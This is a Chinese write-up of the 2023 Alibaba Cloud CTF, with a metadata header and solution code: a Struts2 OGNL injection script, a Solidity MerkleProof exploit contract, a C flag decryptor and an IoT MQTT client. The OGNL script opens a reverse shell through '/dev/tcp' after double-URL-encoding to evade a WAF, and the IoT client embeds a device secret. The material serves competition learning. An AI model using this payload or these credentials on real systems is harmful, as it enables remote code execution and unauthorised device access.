---
title: 2023 阿里云 CTF writeup by Mini-Venom
contest: 阿里云CTF
year: 2023
difficulty: medium
vuln_type:
- web_unknown
- ssti
- crypto_unknown
- pwn_unknown
- iot
tags:
- Struts2 OGNL
- 双重URL编码
- Solidity MerkleProof
- 偏移绕过
- IoT linkkit MQTT
- 异或差分逆向
attack_chain: 'OGNL 表达式 #a.getClass().forName("java.lang.Runtime") 反射执行 → 双重 URL 编码绕 WAF → Solidity MerkleProof 合约 proofs[i] 数组下标错误 → 提交 proof[i]=i 而非按叶子节点配对 → 异或差分循环解 flag → aliyun-iot-linkkit python SDK 模拟 IoT 设备连 MQTT'
key_payload: '"(#r="a".getClass().forName("java.lang.Runtime")).(#m=#r.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).(#o=#m.invoke(null,null)).(#e=#r.getDeclaredMethods().{? ...}.{? ...}[0]).(#e.invoke(#o,new String[]{"sh","-c","echo ...|base64 -d|bash"}))" 双重 URL 编码'
one_liner: Struts2 OGNL 双重 URL 编码 + Solidity MerkleProof 数组错配 + IoT 模拟器 + 异或差分逆 C。
lesson: Solidity MerkleProof 验证时 array.length 检查不严时可手动配错位绕过；OGNL 表达式 WAF 需双重 URL 编码。
quality: medium
full_path: 2023阿里云CTF_writeup_by_Mini-Venom.full.md
meta_path: 2023阿里云CTF_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 2
schema_version: v3.0.0-P0
summary: 2023 阿里云 CTF writeup by Mini-Venom。Struts2 OGNL 双重 URL 编码 + Solidity MerkleProof 数组错配 + IoT 模拟器 + 异或差分逆 C。。经验：Solidity MerkleProof 验证时 array.length 检查不严时可手动配错位绕过；OGNL 表达式...
category: web
subcategory: web_other
subcategories:
- web_other
- ssti
- crypto_other
- pwn_other
tools_used:
- C
- Python
- Solidity
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 2
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/112439.html
wp_author: Mini-Venom
reasoning_chain:
- 触发点：app/user/%s 路径回显 → 假设：Struts2 框架 action 路由拼接 → 动作：注入 /action/ 前缀配合 quote 双重 URL 编码 OGNL
- 观察：WAF 拦截单层 URL 编码 → 假设：双层 quote(quote(payload)) 绕过 → 动作：python quote 二重编码 java.lang.Runtime 调用
- 触发点：合约 Greeter.b(leafs, proofs, index) 接受外部输入 → 假设：MerkleProof 验证逻辑不严 → 动作：阅读 storage slot 找到 verify 函数
- 观察：proofs[i] 数组长度不匹配叶子节点但 index[]=i 强行通过 → 假设：未做 array.length == path 校验 → 动作：构造 4 叶子 + 错配 proofs + index[i]=i
- 触发点：固件 aliyun-iot-linkkit python SDK + MQTT → 假设：模拟 IoT 设备连云 → 动作：pip install aliyun-python-sdk-iot-linkkit 注册三元组
- 观察：MQTT 上线成功但需触发业务回调 → 下一步：逆向 C 固件 enc 数组解异或差分
- 动作：分析 decrypt 函数 r0=enc[18], r1=159 循环递推 → 观察：enc[i] - enc[i-1] - 51 是线性递推
- 假设：flag[i] 由前序值决定 → 动作：C 编译反推所有字节 → 观察：还原完整 flag 字符串
failed_attempts:
- 试图单层 URL 编码 OGNL payload → 失败：WAF 关键词匹配 java.lang.Runtime
- 试图用 MerkleProof 标准 proofs 数组顺序构造 → 失败：必须 length==path 才验证通过
- 试图直接调用 c3p0 TemplatesImpl 黑名单绕过的 gadget → 失败：TemplatesImpl 在黑名单内
key_observations:
- Struts2 OGNL 在 WAF 后必须双层 URL 编码 quote(quote(x))
- Solidity MerkleProof 不严时 proofs[i] 数组错配 + index[i]=i 即可绕过
- C 固件异或差分递推 flag[i] = enc[i] - enc[i-1] - 51 是常见混淆还原套路
- aliyun-iot-linkkit python SDK 是模拟 IoT 设备连阿里云最快路径
prerequisites:
- Struts2 OGNL 表达式语法（getClass().forName 反射）
- Solidity MerkleProof 验证原理
- C 语言逆向基础（位运算、字节递推）
- MQTT 协议与 IoT 三元组认证
---
# 2023阿里云CTF writeup by Mini-Venom

> 原文: https://www.ctfiot.com/112439.html
> ID: 112439

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)


```
import requests as req
from urllib.parse import quote
import base64

url = "http://120.55.13.151:
8080/app/user/%s"
headers = {
    "Accept": "application/json, text/plain, */*",
    "Referer": "http://120.55.13.151:
8080/app/",
    "Connection": "close"}

payload = '(#r="a".getClass().forName("java.lang.Runtime")).(#m=#r.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).(#o=#m.invoke(null,null)).(#e=#r.getDeclaredMethods().{? #this.name.equals("exec")}.{? #this.getParameters()[0].getType().getName().equals("[Ljava.lang.String;")}.{? #this.getParameters().length == 1}[0]).(#e.invoke(#o,new String[]{"sh","-c","echo %s |base64 -d|bash"}))' % base64.b64encode(b"bash -i >& /dev/tcp/vps/8099 0>&1")
payload = "../../action/%s" % quote(quote(payload))
resp = req.get(url % payload.replace("/","%252F"), headers=headers)
contract exp {
    address public greeter;
    constructor(address _greeter) public {
        greeter = _greeter;
    }

    function go() public {
        bytes32[] memory leafs;
        leafs = new bytes32[](4);

        leafs[0] = bytes32(0x81376b9868b292a46a1c486d344e427a3088657fda629b5f4a647822d329cd6a);
        leafs[1] = bytes32(0x28cac318a86c8a0a6a9156c2dba2c8c2363677ba0514ef616592d81557e679b6);
        leafs[2] = bytes32(0x804cd8981ad63027eb1d4a7e3ac449d0685f3660d6d8b1288eb12d345ca2331d);
        leafs[3] = bytes32(0x9b1a0a45cfdc60f45820808958c1895d44da61c8f804f5560020a373b23ad51e);
        // leafs[4] = bytes32(0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486);

        bytes32[][] memory proofs;

        proofs = new bytes32[][](4);

        proofs[0] = new bytes32[](2);
        proofs[0][0] = bytes32(0x28cac318a86c8a0a6a9156c2dba2c8c2363677ba0514ef616592d81557e679b6);
        proofs[0][1] = bytes32(0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486);

        proofs[1] = new bytes32[](2);
        proofs[1][0] = bytes32(0x81376b9868b292a46a1c486d344e427a3088657fda629b5f4a647822d329cd6a);
        proofs[1][1] = bytes32(0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486);

        proofs[2] = new bytes32[](2);
        proofs[2][0] = bytes32(0x804cd8981ad63027eb1d4a7e3ac449d0685f3660d6d8b1288eb12d345ca2331d);
        proofs[2][1] = bytes32(0x9b1a0a45cfdc60f45820808958c1895d44da61c8f804f5560020a373b23ad51e);

        proofs[3] = new bytes32[](1);
        proofs[3][0] = bytes32(0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486);

        // proofs[4] = new bytes32[](1);
        // proofs[4][0] = bytes32(0x9b1a0a45cfdc60f45820808958c1895d44da61c8f804f5560020a373b23ad51e);

        uint256[] memory index;
        index = new uint256[](4);
        for (uint256 i=0;i<3;i++) {
            index[i] = i;
        }

        index[3] = 0;
        // index[4] = 1;

        Greeter(greeter).b(leafs, proofs, index);
    }
}
    #include <stdio.h>
    #include <stdint.h>

uint8_t enc[] = {
    0x3e, 0xdd, 0x79, 0x25, 0xcd, 0x6e, 0x04, 0xab,
    0x44, 0xf2, 0x5b, 0xef, 0x57, 0xbc, 0x53, 0xbd,
    0x20, 0xb7, 0x4b, 0x8c, 0x11, 0xf8, 0x93, 0x09,
    0x0f, 0xdc, 0xdf, 0xdd, 0xad, 0x07, 0x09, 0x10,
    0x01, 0x00, 0xfe, 0x6a, 0x92, 0x30, 0x33, 0x32,
    0x34, 0xfb, 0xae
};

void decrypt(uint8_t *enc, uint8_t *flag, int len) {
    // Initialize variables
    uint8_t r0 = enc[18];
    uint8_t r1 = 159;

    // Decrypt byte sequence
    for (int i = len - 1; i >= 0; i--) {
        if (i > 0 && i < 19) {
            flag[i] = (enc[i] - enc[i - 1] - 51) % 256;
        } else if (i == 0) {
            flag[i] = (enc[i] - 170 - 51) % 256;
        } else {
            r1 ^= enc[i];
            flag[i] = (enc[i] - r1) % 256;
        }
    }
}

int main() {
    uint8_t flag[43] = {0};
    decrypt(enc, flag, 43);
    for (int i = 0; i < 43; i++) {
        printf("%c ", flag[i]);
    }
    printf("n");
    return 0;
}
    #pip3 install aliyun-iot-linkkit 
import sys
from linkkit import linkkit
import threading
import traceback
import inspect
import time
import logging

# config log
__log_format = '%(asctime)s-%(process)d-%(thread)d - %(name)s:%(module)s:%(funcName)s - %(levelname)s - %(message)s'
logging.basicConfig(format=__log_format)

lk = linkkit.LinkKit(
    host_name="cn-shanghai",
    product_key="a1eAwsBKddO",
    device_name="ncApIY2XV9NUIY4VpbGk",
    device_secret="04845e512ead208b2437d970a154d69e")
# lk.config_mqtt(endpoint="iot-cn-6ja******.mqtt.iothub.aliyuncs.com")

lk.enable_logger(logging.DEBUG)

def on_device_dynamic_register(rc, value, userdata):
    if rc == 0:
        print("dynamic register device success, value:" + value)
    else:
        print("dynamic register device fail, message:" + value)

def on_connect(session_flag, rc, userdata):
    print("on_connect:%d,rc:%d" % (session_flag, rc))
    pass

def on_disconnect(rc, userdata):
    print("on_disconnect:rc:%d,userdata:" % rc)

def on_topic_message(topic, payload, qos, userdata):
    print("on_topic_message:" + topic + " payload:" + str(payload) + " qos:" + str(qos))
    pass

def on_subscribe_topic(mid, granted_qos, userdata):
    print("on_subscribe_topic mid:%d, granted_qos:%s" %
          (mid, str(','.join('%s' % it for it in granted_qos))))
    pass

def on_unsubscribe_topic(mid, userdata):
    print("on_unsubscribe_topic mid:%d" % mid)
    pass

def on_publish_topic(mid, userdata):
    print("on_publish_topic mid:%d" % mid)

lk.on_device_dynamic_register = on_device_dynamic_register
lk.on_connect = on_connect
lk.on_disconnect = on_disconnect
lk.on_topic_message = on_topic_message
lk.on_subscribe_topic = on_subscribe_topic
lk.on_unsubscribe_topic = on_unsubscribe_topic
lk.on_publish_topic = on_publish_topic

lk.config_device_info("Eth|03ACDEFF0032|Eth|03ACDEFF0031")
lk.config_mqtt(port=1883, protocol="MQTTv311", transport="TCP",secure="TLS")
lk.connect_async()
lk.start_worker_loop()

while True:
    try:
        msg = input()
    
except KeyboardInterrupt:
        sys.exit()
    else:
        if msg == "1":
            lk.disconnect()
        elif msg == "2":
            lk.connect_async()
        elif msg == "3":
            rc, mid = lk.subscribe_topic(lk.to_full_topic("user/get"))
            if rc == 0:
                print("subscribe topic success:%r, mid:%r" % (rc, mid))
            else:
                print("subscribe topic fail:%d" % rc)
        elif msg == "4":
            rc, mid = lk.unsubscribe_topic(lk.to_full_topic("user/get"))
            if rc == 0:
                print("unsubscribe topic success:%r, mid:%r" % (rc, mid))
            else:
                print("unsubscribe topic fail:%d" % rc)
        elif msg == "5":
            rc, mid = lk.publish_topic(lk.to_full_topic("user/update"), "{"id":"1","version":"1.0","params":{"LightSwitch":0}}")
            if rc == 0:
                print("publish topic success:%r, mid:%r" % (rc, mid))
            else:
                print("publish topic fail:%d" % rc)
        elif msg == "8":
            ret = lk.dump_user_topics()
            print("user topics:%s", str(ret))
        elif msg == "9":
            lk.destruct()
            print("destructed")
        else:
            sys.exit()
```


---
## 附图

[图片已移除]
[图片已移除]